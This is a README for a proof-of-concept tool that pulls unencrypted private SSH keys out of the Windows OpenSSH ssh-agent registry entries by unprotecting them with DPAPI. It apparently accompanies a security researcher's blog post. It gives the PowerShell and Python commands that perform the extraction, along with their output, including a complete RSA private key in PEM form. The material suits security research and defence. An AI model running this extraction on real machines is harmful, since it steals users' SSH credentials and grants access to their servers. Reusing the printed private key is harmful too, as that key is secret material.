# Intro
These scripts are a PoC for how to extract unencrypted private SSH keys from Windows when the new OpenSSH `ssh-agent.exe` is used.

When adding private keys to `ssh-agent`, Windows protects the private keys with DPAPI and stores them as registry entries under `HKCU:\Software\OpenSSH\Agent\Keys`

With elevated privileges, it is possible to pull out the binary blobs from the registry and unprotect them using DPAPI. These blobs can then be restructured into the original, unencrypted private RSA keys.

All credit for the Python code should go to the original implementatoin by soleblaze and his script `parse-mem.py` [here](https://github.com/NetSPI/sshkey-grab/blob/master/parse_mem.py)

# Usage
From an elevated Powershell prompt, use `extract_ssh_keys.ps1` to generate a JSON file which contains the Base64 data of the unprotected SSH keys. This script works by enumerating all SSH keys stored in the registry and calling DPAPI with the "Current User" context to unprotect the binary data.

```
C:\tools> .\extract_ssh_keys.ps1
Pulling key:  .\ropnopkey2
Pulling key:  .\ropnopkey1
extracted_keyblobs.json written. Use Python script to reconstruct private keys: python extractPrivateKeys.py extracted_keyblobs.json
```

The Python script requires Python 3 and the `pyasn1` package. Run the Python script on the saved JSON file to re-construct the original, uncnecrypted RSA private keys:

```
C:\tools> python .\extractPrivateKeys.py .\extracted_keyblobs.json
[+] Key Comment: .\ropnopkey2
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAtekm5ikm0lh9fIiqslAUVUAhbI48/+khBFstx7jbz0XfcvAo
XS3wxeer7UeaIXRJAXARy4ARi6fk9W6PfdP3zKFd7D1MV1WG0FAogxWUXOxiYxgZ
yihsYNQ2NQmnVrW2C67+RZ2tTwNEEUGRVPi0QRjLlwXWPm6+0bFF4d0A7ivwTa0+
EYVow48E74v5BMOxW+h87ZassRvAO22vZXV7Tr/VnwM3GoLPXTSAUxVsO0nhDs07
JCXsu8oO7zH3Ql/I330QxAYo3qG0c/Ega3m474vVdIQOYdiaYxmN1u29wR9MAUNx
/fY9yOTc0+prwWVt5GqZ3y89d9PI1VJfqNa6LQIDAQABAoIBAQCLjycHtxSQldEY
BKWojWU8DipWZT2JO+rXs7gInNsORtXqETN2YTNyMY2mSaOG/PaxgrA0RrmvQgyW
+s5dQ4y90iMDhfeWnQgDsyuRfbHIJJZK3geTH7YeB1DbGd/m1xumFQgAkrqOfrvu
3TXJUdDAjGxNHe5DEaWVrIIniO0YyxMV10M2s2D6GtNHBjzop9YDegvkeQxNbO0K
tKcDhJ/QPrkT+J8yCnRpStYC+kNlbOlBKkmdTJ5nhtmlZ8mWqpIgocvKrOZavsAh
7SKpWt/Sjjoc+8wwt4dNiy8WnbHGFPb6W9lxdjDxpmoTn2bQOaS0oo61KJU7m60O
SdgQwtUBAoGBAOXhnKWe2wKN/sx+/PYEvh2bi5xtugcOufCTqFlTYpxsgG0717s2
1Ljwh7yjtTv6bS+6tXFrAy8QhKwLiuXnn8OAaPb9hMbpqGDhk04GcDWP/1oqS/2Y
gMfeoBF6P3+q969kFbZwMCj/zsOEXnwTJGN6bxHBKassslts3Lf8jVjtAoGBAMqU
QY0EebxJAQm3BgsQ0fsNli0CFGAm7iSlYmsSkcbcwZfL9hzxccKZDpZpXr2WV9wf
dqfUoQyowSbZEz5kcuEeRe4Ofzf0ADs0fdMYRg0fvZ9JUCsTq+ecj3U25vNeXW9F
kD7mYnEbY9lMkMvna4uthraxBQEZyyWjHsu2mP5BAoGBALukYFBUjeLU8zILSgKr
NmBGkjw62Mlf/OjiLl3Tkb+rVV1UprCbfiIDvFh/rLTromp+VhLhTfUB37nrphIp
8iAL1iIeKF6RZa7HEo1y9e7SvpXjxqmW7S+4iiIaDnDwpkLVSF/lzXn57NVtXA6d
NWu6CaWNbazazC+Secv464u1AoGAdK2tj75bK3JU8baD+Y2nk9UAgU3oVHU3xs2n
AQrCAesWagrk50i9gBrOBx4LnmDgm/1XR1U1qWftUCXJaq9KZ5UbLAEXjy+vjmou
ao5ZkqeMfRkp3pXG9nD7Q8TqgpQAdt13NnNVkdX3zanG4FqbW+kHZWRSAI9NrZDl
ZOn39sECgYBj6IPFbBxllysESiV6Tcvb98ffKjWBvL3MM4ENfzlH0fCNGNkVPDvn
ufMwjM3PqhUFXVBQHm0eMZDLLcLpLUxxIpiOdmLDk6XhAY+1Vc90OmDrCoADUxdg
Eq/hFJMNz4ZMio4KVd+BUVM2rt4zjq0tcxtOrMABdddCRBkuwhluSQ==
-----END RSA PRIVATE KEY-----
```

Blog post here explaining my process: https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent

## Credits
https://gist.github.com/atifaziz/10cb04301383972a634d0199e451b096

https://blog.netspi.com/stealing-unencrypted-ssh-agent-keys-from-memory/

https://github.com/NetSPI/sshkey-grab

